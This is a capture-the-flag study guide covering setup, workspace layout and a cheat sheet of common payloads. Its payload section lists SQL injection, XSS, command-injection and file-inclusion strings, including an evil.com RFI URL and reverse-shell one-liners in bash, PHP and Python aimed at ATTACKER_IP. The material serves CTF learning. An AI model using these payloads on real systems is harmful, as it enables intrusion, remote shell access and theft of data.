# Ultimate CTF Guide: Tips, Tricks, Payloads, and Pro Strategies

## Table of Contents

- [1. CTF Basics](#ctf-basics)
- [2. Pro CTF Player Mindset](#pro-ctf-player-mindset)
- [3. Essential Setup for CTFs](#essential-setup-for-ctfs)
- [4. Folder Structure for CTFs](#folder-structure-for-ctfs)
- [5. Must-Know Payloads & Techniques](#must-know-payloads--techniques)
- [6. Useful Tools & Resources](#useful-tools--resources)

---

## 1. CTF Basics

- **CTF (Capture The Flag)** competitions are cybersecurity challenges where you solve tasks to find "flags" (secret strings).
- Categories: Web, Crypto, Pwn, Forensics, OSINT, Reversing, Misc.

## 2. Pro CTF Player Mindset

- **Practice regularly**: Use platforms like [Hack The Box](https://www.hackthebox.com/), [TryHackMe](https://tryhackme.com/), [CTFtime](https://ctftime.org/).
- **Take notes**: Document every trick, payload, and solution.
- **Automate**: Write scripts to speed up repetitive tasks.
- **Teamwork**: Collaborate, share knowledge, and communicate.
- **Stay updated**: Follow writeups, blogs, and new vulnerabilities.
- **Think outside the box**: Try unexpected inputs and approaches.

## 3. Essential Setup for CTFs

### Recommended Environments

- **Kali Linux (VM or Bare Metal)**: Most tools pre-installed, stable.
- **Parrot OS**: Lighter, privacy-focused, also CTF-ready.
- **WSL2 (Windows Subsystem for Linux)**: Good for quick access, but some tools may not work.
- **Custom Ubuntu/Debian VM**: Install only what you need.
- **Cloud VMs**: For heavy tasks or remote access.

**Pro Tip:** Use a VM snapshot before each CTF for easy rollback.

### Tools to Install

- `nmap`, `gobuster`, `ffuf`, `sqlmap`, `burpsuite`, `john`, `hydra`, `ghidra`, `pwntools`, `binwalk`, `wireshark`, `gdb`, `radare2`, `python3`, `pip`, `git`, `docker`, `tmux`, `zsh`.

## 4. Folder Structure for CTFs

Organize by platform and challenge:

```plaintext
CTF-Workspace/
├── HTB/
│   ├── Machine-Name/
│   │   ├── notes.md
│   │   ├── exploits/
│   │   ├── loot/
│   │   └── screenshots/
├── THM/
│   ├── Room-Name/
│   │   ├── notes.md
│   │   ├── scripts/
│   │   └── loot/
├── CTFtime/
│   ├── Event-Name/
│   │   ├── web/
│   │   ├── pwn/
│   │   ├── crypto/
│   │   └── notes.md
└── Tools/
    └── custom-scripts/
```

**Tips:**

- Use `notes.md` for each challenge.
- Save all payloads, scripts, and loot (flags, hashes, etc).
- Take screenshots of key steps.

## 5. Must-Know Payloads & Techniques

### Web Exploitation

- **SQL Injection**
  - `' OR 1=1-- -`
  - `admin'--`
  - `" OR "1"="1"
  - `UNION SELECT username, password FROM users--`
- **XSS (Cross-Site Scripting)**
  - `<script>alert(1)</script>`
  - `"><img src=x onerror=alert(1)>`
  - `javascript:alert(document.cookie)`
- **Command Injection**
  - `; ls -la`
  - `| whoami`
  - `$(id)`
- **LFI/RFI**
  - `../../../../etc/passwd`
  - `php://filter/convert.base64-encode/resource=index.php`
  - `http://evil.com/shell.txt`
- **Common Directories/Files**
  - `/admin`, `/backup`, `/robots.txt`, `/config.php`, `.git/`, `.env`

### Password Attacks

- **Default Credentials**: `admin:admin`, `root:toor`, etc.
- **Wordlists**: Use `rockyou.txt`, `SecLists`.
- **Hash Cracking**: `john --wordlist=rockyou.txt hash.txt`

### Reverse Shells

- **Bash**: `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1`
- **PHP**: `php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`
- **Python**: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`

### File Transfer

- **Python HTTP Server**: `python3 -m http.server 8000`
- **Netcat**: `nc -lvnp 4444 > file`

### Enumeration

- **nmap**: `nmap -sC -sV -oN nmap.txt TARGET`
- **Gobuster**: `gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt`

### Forensics

- **Steghide**: `steghide extract -sf file.jpg`
- **Binwalk**: `binwalk -e file.bin`
- **Strings**: `strings file`

### Miscellaneous

- **Base64**: `echo 'aGVsbG8=' | base64 -d`
- **ROT13**: `tr 'A-Za-z' 'N-ZA-Mn-za-m'`
- **URL Decode**: `python3 -c 'import urllib.parse; print(urllib.parse.unquote("string"))'`

## 6. Useful Tools & Resources

- [SecLists](https://github.com/danielmiessler/SecLists) - Wordlists for everything
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [GTFOBins](https://gtfobins.github.io/)
- [Reverse Shell Cheat Sheet](https://www.revshells.com/)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [CrackStation](https://crackstation.net/)

---

**Keep learning, keep hacking, and always take notes!**
